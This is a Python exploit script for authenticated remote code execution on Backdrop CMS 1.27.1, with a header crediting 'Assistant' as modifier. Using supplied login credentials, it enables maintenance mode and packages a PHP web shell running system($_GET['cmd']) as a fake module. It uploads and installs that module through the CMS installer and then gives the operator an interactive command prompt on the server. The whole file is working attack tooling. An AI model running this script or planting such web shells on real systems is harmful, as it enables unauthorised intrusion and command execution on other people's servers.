# Title  : Backdrop CMS 1.27.1 – Authenticated RCE
# Modified by: Assistant
# Usage  : python3 backdrop_rce.py <url> <username> <password>

import os
import re
import sys
import tarfile
import tempfile
import time
import json
import argparse
import requests
from html.parser import HTMLParser
from urllib.parse import urljoin, urlparse, parse_qs
from requests_toolbelt.multipart.encoder import MultipartEncoder

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

def print_message(msg, msg_type="info"):
    """Print colored messages"""
    colors = {
        "info": "\033[32m[>]\033[0m",
        "error": "\033[31m[!]\033[0m",
        "warning": "\033[33m[~]\033[0m"
    }
    print(f"{colors.get(msg_type, colors['info'])} {msg}", flush=True)

def die(msg):
    """Exit with error message"""
    print_message(msg, "error")
    sys.exit(1)

class FormParser(HTMLParser):
    """HTML parser to extract hidden form fields"""
    def __init__(self):
        super().__init__()
        self.hidden_fields = []
    
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            attrs_dict = dict(attrs)
            if attrs_dict.get("type") == "hidden" and "name" in attrs_dict:
                self.hidden_fields.append((attrs_dict["name"], attrs_dict.get("value", "")))

def extract_hidden_fields(html):
    """Extract hidden form fields from HTML"""
    parser = FormParser()
    parser.feed(html)
    return dict(parser.hidden_fields)

def login(session, base_url, username, password):
    """Login to Backdrop CMS"""
    print_message(f"Logging in as user: '{username}'")
    
    # Get login page
    login_url = f"{base_url}/?q=user/login"
    response = session.get(login_url, verify=False)
    
    # Extract form_build_id
    form_build_id_match = re.search(r'name="form_build_id" value="([^"]+)"', response.text)
    if not form_build_id_match:
        die("Could not find form_build_id on login page")
    
    form_build_id = form_build_id_match.group(1)
    
    # Prepare login data
    login_data = {
        "name": username,
        "pass": password,
        "form_build_id": form_build_id,
        "form_id": "user_login",
        "op": "Log in"
    }
    
    # Submit login form
    session.post(login_url, data=login_data, verify=False)
    
    # Verify login was successful
    user_page = session.get(f"{base_url}/?q=user", verify=False).text
    if "Log out" not in user_page:
        die("Login failed - check credentials")
    
    print_message("Login successful")

def enable_maintenance_mode(session, base_url):
    """Enable maintenance mode"""
    print_message("Enabling maintenance mode")
    
    maintenance_url = f"{base_url}/?q=admin/config/development/maintenance"
    response = session.get(maintenance_url, verify=False)
    hidden_fields = extract_hidden_fields(response.text)
    
    maintenance_data = {
        "maintenance_mode": "1",
        "form_build_id": hidden_fields["form_build_id"],
        "form_token": hidden_fields["form_token"],
        "form_id": "system_site_maintenance_mode",
        "op": "Save configuration"
    }
    
    session.post(maintenance_url, data=maintenance_data, verify=False)
    print_message("Maintenance mode enabled")

def create_malicious_module():
    """Create a malicious module with PHP shell"""
    # Generate random module name
    module_name = "rvz" + os.urandom(3).hex()
    
    # Create temporary directory
    temp_dir = tempfile.mkdtemp(prefix="bd_")
    module_dir = os.path.join(temp_dir, module_name)
    os.makedirs(module_dir, exist_ok=True)
    
    # Create module info file
    info_content = f"name = {module_name}\ntype = module\nbackdrop = 1.x\n"
    with open(f"{module_dir}/{module_name}.info", "w") as f:
        f.write(info_content)
    
    # Create PHP shell
    php_shell = """<?php 
if(isset($_GET['cmd'])) {
    echo '<pre>';
    system($_GET['cmd']);
    echo '</pre>';
}
?>"""
    with open(f"{module_dir}/shell.php", "w") as f:
        f.write(php_shell)
    
    # Create tar.gz archive
    archive_path = os.path.join(temp_dir, f"{module_name}.tgz")
    with tarfile.open(archive_path, "w:gz") as tar:
        tar.add(module_dir, arcname=module_name)
    
    print_message(f"Created malicious module: {archive_path}")
    return archive_path, module_name

def upload_and_install_module(session, base_url, archive_path, module_name):
    """Upload and install the malicious module"""
    print_message("Fetching installer form")
    
    installer_url = f"{base_url}/?q=admin/installer/manual"
    response = session.get(installer_url, verify=False)
    hidden_fields = extract_hidden_fields(response.text)
    
    # Get theme information
    theme = hidden_fields.get("ajax_page_state[theme]", "seven")
    theme_token = hidden_fields.get("ajax_page_state[theme_token]", "")
    
    print_message("Uploading payload")
    
    # Prepare multipart form data
    multipart_data = MultipartEncoder(
        fields=[
            ("bulk", ""),
            ("project_url", ""),
            ("files[project_upload]", (f"{module_name}.tgz", open(archive_path, "rb"), 
                                      "application/x-compressed-tar")),
            ("form_build_id", hidden_fields["form_build_id"]),
            ("form_token", hidden_fields["form_token"]),
            ("form_id", "installer_manager_install_form"),
            ("_triggering_element_name", "op"),
            ("_triggering_element_value", "Install"),
            ("ajax_html_ids[]", "skip-link"),
            ("ajax_html_ids[]", "main-content"),
            ("ajax_html_ids[]", "installer-manager-install-form"),
            ("ajax_html_ids[]", "edit-bulk-wrapper"),
            ("ajax_html_ids[]", "edit-bulk"),
            ("ajax_html_ids[]", "edit-project-url-wrapper"),
            ("ajax_html_ids[]", "edit-project-url"),
            ("ajax_html_ids[]", "edit-project-upload-wrapper"),
            ("ajax_html_ids[]", "edit-project-upload"),
            ("ajax_html_ids[]", "edit-actions"),
            ("ajax_html_ids[]", "edit-submit"),
            ("ajax_page_state[theme]", theme),
            ("ajax_page_state[theme_token]", theme_token)
        ]
    )
    
    # Set headers for AJAX request
    headers = {
        "Content-Type": multipart_data.content_type,
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/vnd.backdrop-ajax, */*;q=0.01",
        "Referer": f"{base_url}/?q=admin/installer/manual"
    }
    
    # Upload the module
    upload_url = f"{base_url}/?q=system/ajax"
    response = session.post(upload_url, data=multipart_data, headers=headers, verify=False)
    
    print_message("Module upload completed")
    
    # Process the response
    try:
        response_data = json.loads(response.text)
        redirect_url = None
        
        for command in response_data:
            if command.get("command") == "redirect":
                redirect_url = command["url"]
                break
        
        if not redirect_url:
            die("No redirect URL found in response")
        
        # Extract batch ID from redirect URL
        parsed_url = urlparse(redirect_url)
        query_params = parse_qs(parsed_url.query)
        batch_id = query_params["id"][0]
        
        print_message(f"Batch ID: {batch_id}")
        
        # Authorize the installation
        for op in ("do_nojs", "do"):
            auth_url = f"{base_url}/core/authorize.php"
            params = {"batch": "1", "id": batch_id, "op": op}
            auth_headers = {
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json, text/javascript, */*; q=0.01"
            }
            
            session.post(auth_url, params=params, headers=auth_headers, verify=False)
        
        return True
        
    except (json.JSONDecodeError, KeyError, IndexError) as e:
        die(f"Failed to process upload response: {e}")
    
    return False

def get_interactive_shell(session, base_url, module_name):
    """Get an interactive shell"""
    shell_url = urljoin(base_url + "/", f"modules/{module_name}/shell.php")
    
    print_message(f"Waiting for shell at: {shell_url}")
    
    # Wait for the shell to be available
    for _ in range(12):
        response = session.get(shell_url, verify=False)
        if response.status_code == 200:
            print_message("Shell is live!")
            break
        time.sleep(1)
    else:
        die("Shell not found - installation probably failed")
    
    # Get current user and hostname for prompt
    current_user = os.getlogin()
    target_hostname = urlparse(base_url).netloc
    
    print_message("Interactive shell - type 'exit' to quit")
    
    # Interactive shell loop
    while True:
        try:
            cmd = input(f"{current_user}@{target_hostname} > ").strip()
            if cmd.lower() == "exit":
                break
            if not cmd:
                continue
            
            response = session.get(shell_url, params={"cmd": cmd}, verify=False)
            output_match = re.search(r"<pre>(.*?)</pre>", response.text, re.DOTALL)
            
            if output_match:
                print(output_match.group(1).strip())
            else:
                print_message("No output - PHP shell might not be accessible", "warning")
                
        except EOFError:
            break
        except KeyboardInterrupt:
            print("\nUse 'exit' to quit")
        except Exception as e:
            print_message(f"Error: {e}", "error")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Backdrop CMS Authenticated RCE Exploit")
    parser.add_argument("url", help="Base URL of the Backdrop CMS installation")
    parser.add_argument("username", help="Username for authentication")
    parser.add_argument("password", help="Password for authentication")
    
    args = parser.parse_args()
    
    # Validate URL
    base_url = args.url.rstrip("/")
    if not base_url.startswith(("http://", "https://")):
        die("URL must start with http:// or https://")
    
    # Create session
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 Backdrop-RCE-Exploit"
    
    try:
        # Step 1: Login
        login(session, base_url, args.username, args.password)
        
        # Step 2: Enable maintenance mode
        enable_maintenance_mode(session, base_url)
        
        # Step 3: Create malicious module
        archive_path, module_name = create_malicious_module()
        
        # Step 4: Upload and install module
        if upload_and_install_module(session, base_url, archive_path, module_name):
            # Step 5: Get interactive shell
            get_interactive_shell(session, base_url, module_name)
        
    except Exception as e:
        die(f"Unexpected error: {e}")
    
    finally:
        # Clean up
        if 'archive_path' in locals():
            try:
                os.remove(archive_path)
                os.remove(archive_path.replace('.tgz', ''))
            except:
                pass

if __name__ == "__main__":
    main()
